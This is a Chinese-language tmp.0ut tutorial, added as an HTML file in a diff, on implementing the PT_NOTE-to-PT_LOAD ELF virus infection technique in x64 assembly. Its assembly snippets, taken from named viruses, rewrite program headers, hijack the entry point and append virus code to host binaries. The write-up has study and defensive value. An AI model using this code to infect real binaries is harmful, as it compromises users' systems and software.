@@ -1,0 +1,368 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("../gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+在x64汇编中实现PT_NOTE感染方法                                 │                   █   │
+~ sblip和tmp.0ut团队                                         └───────────────────█ ──┘
+
+在tmp.out的第一期中，我们提供了几个PT_NOTE->PT_LOAD感染算法的示例，其中三个是x64汇编版本，
+一个是Rust版本。对于那些正在学习这门技艺的人来说，我认为讨论如何在x64汇编中实现一些具体步骤
+会很有用。2019年3月，当我在进行backdoorfactory的golang重写工作时，我写了一篇关于在golang中
+实现该算法的详细分析，感兴趣的读者可以在下面的链接中找到：
+
+  https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+
+x64的算法当然是相同的，不过我会在下面提供一些代码片段，希望这些能对有志于成为x64汇编ELF
+程序员的读者有所帮助。
+
+我们可以使用上述文章中列出的相同步骤作为参考，尽管根据具体实现，执行这些步骤的顺序可能会
+有所变化。有些方法会先写入一个新文件到磁盘然后进行覆盖，而其他方法则直接写入文件。
+
+从上面的链接中，实现PT_NOTE->PT_LOAD感染算法的一般步骤如下：
+
+  1. 打开要注入的ELF文件
+  2. 保存原始入口点，e_entry
+  3. 解析程序头表，寻找PT_NOTE段
+  4. 将PT_NOTE段转换为PT_LOAD段
+  5. 更改此段的内存保护以允许执行指令
+  6. 将入口点地址更改为不会与原始程序执行冲突的区域
+  7. 调整磁盘上的大小和虚拟内存大小以适应注入代码的大小
+  8. 将我们转换后的段的偏移指向原始二进制文件的末尾，我们将在那里存储新代码
+  9. 用跳转到原始入口点的指令修补代码的末尾
+ 10. 将我们注入的代码添加到文件末尾
+*11. 将文件写回磁盘，覆盖原始文件* -- 我们这里不会讨论这种实现变体，它会在磁盘上创建一个
+     新的临时ELF二进制文件并覆盖宿主文件，如上文所述。
+
+我们将大致遵循上述步骤，但读者应该记住，其中一些步骤可能会以不同的顺序执行（而且有些步骤
+在其他步骤完成之前无法执行）- 但最终所有步骤都必须完成。
+
+1. 打开要注入的ELF文件：
+
+getdents64()系统调用是我们在64位系统上查找文件的方式。该函数定义为：
+
+  int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+
+我们将把实现getdents64()作为读者的练习 - 在本期发布的代码中有几个示例，包括在Midrashim、
+kropotkin、Eng3ls和Bak0unin中。
+
+对于ELF历史学家来说，我20年前写了一篇糟糕的（现在完全过时的）文章，讲述如何在32位AT&T语法
+中实现这一点，位于这里：
+
+  https://tmpout.sh/papers/getdents.old.att.syntax.txt
+
+假设我们已经调用了getdents64()并在栈上存储了目录项结构体，我们可以从查看它得知：
+
+  struct linux_dirent {
+      unsigned long  d_ino;     /* Inode号 */
+      unsigned long  d_off;     /* 到下一个linux_dirent的偏移 */
+      unsigned short d_reclen;  /* 这个linux_dirent的长度 */
+      char           d_name[];  /* 文件名（以null结尾） */
+                        /* 长度实际上是(d_reclen - 2 -
+                           offsetof(struct linux_dirent, d_name)) */
+      /*
+      char           pad;       // 零填充字节
+      char           d_type;    // 文件类型（仅自Linux
+                                // 2.6.4起）；偏移是(d_reclen - 1)
+      */
+  }
+
+以null结尾的文件名d_name位于偏移[rsp+18]或[rsp+0x12]处
+
+  d_ino是字节0-7              - unsigned long
+  d_off是字节8-15             - unsigned long
+  d_reclen是字节16-17         - unsigned short
+  d_name从第18个字节开始      - 以null结尾的文件名
+
+对于我们的open()调用，int open(const char *pathname, int flags, mode_t mode);
+
+  - rax将保存系统调用号，2
+  - rdi将保存文件名d_name，在我们的例子中是[rsp+18]
+  - rsi将保存标志，可以是O_RDONLY (0)或O_RDWR (02)，取决于我们的vx如何工作
+  - rdx将保存模式，但我们不需要这个并将把它置零。
+
+所以以下代码：
+
+  mov rax, 2         ; open系统调用
+  mov rdi, [rsp+18]  ; d_name来自从栈开始处的dirent结构体
+  mov rsi, 2         ; O_RDWR / 读写
+  syscall
+
+如果成功，将在rax中返回文件描述符。如果是0或负数，则打开文件时发生了错误。
+
+  cmp rax, 0
+  jng file_open_error
+
+或
+  test rax, rax
+  js file_open_error
+
+2. 保存原始入口点，e_entry：
+
+在TMZ的Midrashim中，他将原始入口点存储在r14寄存器中以供后续使用，这个值是从栈上复制的。
+高位寄存器r13、r14和r15是存储数据/地址以供后续使用的好地方，因为它们不会被系统调用破坏。
+
+  ; 栈缓冲区：
+  ; r15 + 0 = 栈缓冲区（10000字节）= stat
+  ; r15 + 48 = stat.st_size
+  ; r15 + 144 = ehdr
+  ; r15 + 148 = ehdr.class
+  ; r15 + 152 = ehdr.pad
+  ; r15 + 168 = ehdr.entry
+  ---cut---
+  
+  mov r14, [r15 + 168]  ; 将目标原始ehdr.entry从[r15 + 168]存储到r14中
+
+3. 解析程序头表，寻找PT_NOTE段：
+
+正如你可能从本文的标题中推断的那样，我们的目标是将PT_NOTE段转换为可加载的PT_LOAD段，并具有
+rx（或rwx）权限。如果我不提到这个算法对某些二进制文件（如golang二进制文件）以及使用
+-fcf-protection标志编译的任何二进制文件不能"开箱即用"，那就太失职了，除非我们做一些我们
+还没有做（或看到）的更多魔法操作。下一期内容，Every0ne？
+
+除了这些边缘情况，基本概念很简单 - PT_LOAD段在运行ELF二进制文件时实际上会被加载到内存中 - 
+而PT_NOTE段则不会。但是，如果我们将PT_NOTE段改为PT_LOAD类型，并将内存权限至少更改为读和
+执行，我们就可以在那里放置我们想要运行的代码，将我们的数据写入原始文件的末尾，并更改相关的
+程序头表条目变量以正确加载它。
+
+我们在虚拟地址字段v_addr中放入一个很高的内存值，这样就不会干扰正常的程序执行。然后我们修补
+原始入口点，使其首先跳转到我们新的PT_LOAD段代码，该代码执行它的任务，然后调用原始程序代码。
+
+64位ELF程序头表条目具有以下结构：
+
+  typedef struct {
+      uint32_t   p_type;   // 4字节
+      uint32_t   p_flags;  // 4字节
+      Elf64_Off  p_offset; // 8字节
+      Elf64_Addr p_vaddr;  // 8字节
+      Elf64_Addr p_paddr;  // 8字节
+      uint64_t   p_filesz; // 8字节
+      uint64_t   p_memsz;  // 8字节
+      uint64_t   p_align;  // 8字节
+  } Elf64_Phdr;
+
+
+在这段来自kropotkin.s的代码片段中，我们通过将PHT的偏移加载到rbx中，将PHT条目数加载到ecx中，
+并读取条目开头的前4个字节来循环遍历每个程序头表条目，寻找值为4的条目，这是为PT_NOTE类型段
+指定的数字。
+
+parse_phdr:
+  xor rcx, rcx                       ; 将rcx置零
+  xor rdx, rdx                       ; 将rdx置零
+  mov cx, word [rax+e_hdr.phnum]     ; rcx包含PHT中的条目数
+  mov rbx, qword [rax+e_hdr.phoff]   ; rbx包含PHT的偏移
+  mov dx, word [rax+e_hdr.phentsize] ; rdx包含PHT中一个条目的大小
+
+  loop_phdr:
+      add rbx, rdx                   ; 每次迭代，加上一个PHT条目的大小
+      dec rcx                        ; 减少phnum，直到我们遍历完所有程序头或找到
+                                     ; PT_NOTE段
+      cmp dword [rax+rbx+e_phdr.type], 0x4  ; 如果是4，我们找到了一个PT_NOTE段，
+                                            ; 并转到感染它
+      je pt_note_found
+      cmp rcx, 0
+      jg loop_phdr
+      ...
+      ...
+  pt_note_found:
+
+4. 将PT_NOTE段转换为PT_LOAD段：
+
+要将PT_NOTE段转换为PT_LOAD段，我们必须更改描述该段的程序头表条目中的几个值。
+
+注意，32位ELF二进制文件有不同的PHT条目结构，p_flags值是结构体中的第7个条目，而在其64位
+对应项中是第2个条目。
+
+  typedef struct {
+      uint32_t   p_type;  <-- 将此值更改为PT_LOAD == 1
+      uint32_t   p_flags; <-- 更改为至少具有读+执行权限
+      Elf64_Off  p_offset;
+      Elf64_Addr p_vaddr; <-- 段将被加载的很高的虚拟地址
+      Elf64_Addr p_paddr;
+      uint64_t   p_filesz;
+      uint64_t   p_memsz;
+      uint64_t   p_align;
+  } Elf64_Phdr;
+
+首先，p_type必须从PT_NOTE（值为4）更改为PT_LOAD（值为1）。
+
+其次，p_flags必须至少更改为允许读和执行访问。这是一个标准的位掩码，就像unix文件权限一样，
+其中：
+
+  PF_X == 1
+  PF_W == 2
+  PF_R == 4
+
+在fasm语法中，如下所示，这只需简单地输入"PF_R or PF_X"即可。
+
+第三，我们需要为新的病毒数据选择一个加载地址。一个常见的技术是选择一个很高的地址，0xc000000，
+这个地址不太可能与现有段重叠。我们将其添加到stat.st_size文件大小中，在下面的例子中，这个
+大小已从r15+48检索并存储在r13中，然后我们加上0xc000000。然后我们将这个值存储在p_vaddr中。
+
+来自TMZ的Midrashim：
+
+  .patch_phdr:
+    mov dword [r15 + 208], PT_LOAD              ; 将[r15 + 208]中的phdr类型从
+                                                ; PT_NOTE改为PT_LOAD (1)
+    mov dword [r15 + 212], PF_R or PF_X         ; 将[r15 + 212]中的phdr.flags
+                                                ; 改为PF_X (1) | PF_R (4)
+    pop rax                                     ; 将目标EOF偏移恢复到rax中
+    mov [r15 + 216], rax                        ; phdr.offset [r15 + 216] = 目标
+                                                ; EOF偏移
+    mov r13, [r15 + 48]                         ; 将目标stat.st_size从[r15 + 48]
+                                                ; 存储到r13中
+    add r13, 0xc000000                          ; 将0xc000000加到目标文件大小上
+    mov [r15 + 224], r13                        ; 将[r15 + 224]中的phdr.vaddr
+                                                ; 改为r13中的新值
+                                                ; (stat.st_size + 0xc000000)
+    mov qword [r15 + 256], 0x200000             ; 将[r15 + 256]中的phdr.align设为2mb
+    add qword [r15 + 240], v_stop - v_start + 5 ; 将病毒大小加到[r15 + 240]中的
+                                                ; phdr.filesz上 + 5用于跳转到
+                                                ; 原始ehdr.entry
+    add qword [r15 + 248], v_stop - v_start + 5 ; 将病毒大小加到[r15 + 248]中的
+                                                ; phdr.memsz上 + 5用于跳转到
+                                                ; 原始ehdr.entry
+
+5. 更改此段的内存保护以允许执行指令：
+
+    mov dword [r15 + 212], PF_R or PF_X         ; 将[r15 + 212]中的phdr.flags
+                                                ; 改为PF_X (1) | PF_R (4)
+
+6. 将入口点地址更改为不会与原始程序执行冲突的区域。我们将使用0xc000000。选择一个在虚拟内存中
+   足够高的地址，这样加载时不会与其他代码重叠。
+
+    mov r13, [r15 + 48]     ; 将目标stat.st_size从[r15 + 48]存储到r13中
+    add r13, 0xc000000      ; 将0xc000000加到目标文件大小上
+    mov [r15 + 224], r13    ; 将[r15 + 224]中的phdr.vaddr改为r13中的新值
+                            ; (stat.st_size + 0xc000000)
+
+7. 调整磁盘上的大小和虚拟内存大小以适应注入代码的大小
+
+    add qword [r15 + 240], v_stop - v_start + 5  ; 将病毒大小加到[r15 + 240]中的
+                                                 ; phdr.filesz上 + 5用于跳转到
+                                                 ; 原始ehdr.entry
+    add qword [r15 + 248], v_stop - v_start + 5  ; 将病毒大小加到[r15 + 248]中的
+                                                 ; phdr.memsz上 + 5用于跳转到
+                                                 ; 原始ehdr.entry
+
+8. 将我们转换后的段的偏移指向原始二进制文件的末尾，我们将在那里存储新代码：
+
+   之前在Midrashim中，执行了这段代码：
+    
+    mov rdx, SEEK_END
+    mov rax, SYS_LSEEK
+    syscall                ; 在rax中获取目标EOF偏移
+    push rax               ; 保存目标EOF
+
+   在.patch_phdr中，我们使用这个值作为存储新代码的位置：
+
+    pop rax                ; 将目标EOF偏移恢复到rax中
+    mov [r15 + 216], rax   ; phdr.offset [r15 + 216] = 目标EOF偏移
+
+
+9. 用跳转到原始入口点的指令修补代码的末尾：
+
+   示例#1，来自Midrashim，使用Binjection的算法：
+
+    .write_patched_jmp:
+      ; 获取目标新EOF
+      mov rdi, r9            ; r9包含fd
+      mov rsi, 0             ; 寻址偏移0
+      mov rdx, SEEK_END      ; 从文件末尾开始
+      mov rax, SYS_LSEEK     ; lseek系统调用
+      syscall                ; 在rax中获取目标EOF偏移
+
+      ; 创建修补的跳转
+      mov rdx, [r15 + 224]         ; rdx = phdr.vaddr
+      add rdx, 5                   ; 跳转指令的大小
+      sub r14, rdx                 ; 从我们在步骤#2中存储的e_entry中减去跳转的大小
+                                   ; (保存e_entry)
+      sub r14, v_stop - v_start    ; 减去病毒代码本身的大小
+      mov byte [r15 + 300 ], 0xe9  ; 跳转指令的第一个字节
+      mov dword [r15 + 301], r14d  ; 要跳转到的新地址，通过减去病毒大小和跳转指令
+                                   ; 的大小来更新
+
+   示例#2，来自sblip/s01den vx，使用elfmaster的OEP技术：
+
+    解释这种方法超出了本文档的范围 - 参考：
+
+      https://tmpout.sh/1/11.html
+
+   来自kropotkin.s的代码：
+   
+       mov rcx, r15                    ; 保存的rsp
+       add rcx, VXSIZE
+       mov dword [rcx], 0xffffeee8     ; 相对调用到get_eip
+       mov dword [rcx+4], 0x0d2d48ff   ; sub rax, (VXSIZE+5)
+       mov byte  [rcx+8], 0x00000005 
+       mov word  [rcx+11], 0x0002d48
+       mov qword [rcx+13], r9          ; sub rax, entry0  
+       mov word  [rcx+17], 0x0000548
+       mov qword [rcx+19], r12         ; add rax, sym._start
+       mov dword [rcx+23], 0xfff4894c  ; movabs rsp, r14
+       mov word  [rcx+27], 0x00e0      ; jmp rax
+
+10. 将我们注入的代码添加到文件末尾：
+
+来自Midrashim：
+
+  我们直接将代码添加到文件末尾，并将新的PT_LOAD地址指向它。首先，我们使用lseek系统调用
+  寻址到文件末尾，该文件的文件描述符保存在寄存器r9中。调用.delta将下一条指令的地址压入
+  栈顶，在这种情况下是'pop rbp'。弹出这条指令然后减去.delta将给你运行时病毒的内存地址，
+  这在下面读取/复制病毒代码时使用，你可以在'lea rsi, [rbp + v_start]'中看到 - 提供了
+  读取要写入字节的起始位置，要写入的字节数在调用pwrite64()之前放入rdx中。
+
+  .append_virus:
+    ; 获取目标EOF
+    mov rdi, r9               ; r9包含fd
+    mov rsi, 0                ; 寻址偏移0
+    mov rdx, SEEK_END         ; 从文件末尾开始
+    mov rax, SYS_LSEEK        ; lseek系统调用
+    syscall                   ; 在rax中获取目标EOF偏移
+    push rax                  ; 保存目标EOF
+
+    call .delta               ; 古老的技巧
+    .delta:
+        pop rbp
+        sub rbp, .delta
+
+    ; 将病毒主体写入EOF
+    mov rdi, r9               ; r9包含fd
+    lea rsi, [rbp + v_start]  ; 将v_start地址加载到rsi中
+    mov rdx, v_stop - v_start ; 病毒大小
+    mov r10, rax              ; rax包含来自前一个系统调用的目标EOF偏移
+    mov rax, SYS_PWRITE64     ; 系统调用#18，pwrite()
+    syscall
+
+PT_NOTE感染算法的好处是相对容易学习，而且非常灵活。它可以与其他技术结合使用，任何类型的
+数据都可以存储在转换后的PT_LOAD段中，包括符号表、原始数据、DT_NEEDED对象的代码，甚至是
+完全独立的ELF二进制文件。我希望这篇文章对任何学习x64汇编语言以用于操作ELF二进制文件的人
+都有帮助。 
